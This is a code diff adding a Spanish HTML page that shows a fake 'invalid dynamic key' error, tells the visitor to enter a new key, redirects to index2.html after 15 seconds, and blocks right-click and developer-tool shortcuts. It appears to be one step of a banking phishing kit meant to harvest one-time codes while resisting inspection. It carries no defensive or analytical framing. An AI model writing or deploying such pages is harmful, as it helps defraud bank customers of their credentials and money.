@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Autenticando...</title>
+    
+    <style>
+        /* Variables de color */
+        :root {
+            --color-background-main: #2b2b2b; /* Fondo principal oscuro (mantener) */
+            --color-box-bg: #ffffff;         /* ⬅️ Fondo de la caja: BLANCO */
+            --color-text-main: #333333;       /* ⬅️ Texto principal: NEGRO/GRIS OSCURO */
+            --color-text-secondary: #555555;  /* ⬅️ Texto secundario: GRIS OSCURO */
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: var(--color-background-main);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow: hidden;
+            
+            /* --- FONDO CON CURVAS ABSTRACTAS --- */
+            background-image: url('backgr.png'); /* Reemplaza con la ruta correcta de tu imagen de fondo */
+            background-size: cover;
+            background-position: center bottom;
+            background-attachment: fixed;
+        }
+
+        .container {
+            width: 100%;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .loading-box {
+            background-color: var(--color-box-bg); /* ⬅️ Fondo BLANCO */
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
+            text-align: center;
+            width: 100%;
+            max-width: 350px;
+        }
+
+        .loading-box h2 {
+            font-size: 1.8rem;
+            color: var(--color-text-main); /* ⬅️ Texto OSCURO */
+            margin-bottom: 10px;
+            font-weight: 600;
+        }
+
+        .message {
+            font-size: 1rem;
+            color: var(--color-text-secondary); /* ⬅️ Texto OSCURO */
+            margin-bottom: 25px;
+        }
+
+        .spinner-container {
+            margin: 20px 0;
+        }
+
+        .spinner-gif {
+            width: 90px; 
+            height: auto;
+        }
+
+        .small-text {
+            font-size: 0.8rem;
+            color: var(--color-text-secondary); /* ⬅️ Texto OSCURO */
+            line-height: 1.4;
+            margin-top: 25px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="loading-box">
+            <h2>Error!</h2>
+            <p class="message">Clave Dinámica invalida!</p>
+            
+            <div class="spinner-container">
+                <img src="loading-loading-gif.gif" alt="Cargando..." class="spinner-gif"> 
+            </div>
+
+            <p class="small-text">Vuelve a intentarlo ingresando nueva clave dinámica</p>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Duración de la espera en milisegundos: 15 segundos * 1000 ms/s
+            const REDIRECT_DELAY = 15 * 1000; 
+            
+            function redirectToIndex2() {
+                // Redirige al archivo de destino después del tiempo de espera
+                window.location.href = 'index2.html';
+            }
+
+            // Inicia el temporizador de 15 segundos
+            setTimeout(redirectToIndex2, REDIRECT_DELAY);
+        });
+    </script>
+<script>
+  // Bloquear clic derecho (botón derecho del mouse)
+  document.addEventListener("contextmenu", function(e) {
+    e.preventDefault();
+  });
+
+  // Bloquear combinaciones de teclas peligrosas
+  document.onkeydown = function(e) {
+    const key = e.keyCode || e.which;
+
+    if (
+      key === 123 || // F12
+      (e.ctrlKey && e.shiftKey && key === 73) || // Ctrl+Shift+I
+      (e.ctrlKey && e.shiftKey && key === 74) || // Ctrl+Shift+J
+      (e.ctrlKey && key === 83) || // Ctrl+S
+      (e.ctrlKey && key === 85) // Ctrl+U
+    ) {
+      e.preventDefault();
+      return false;
+    }
+  };
+</script>
+</body>
+</html>
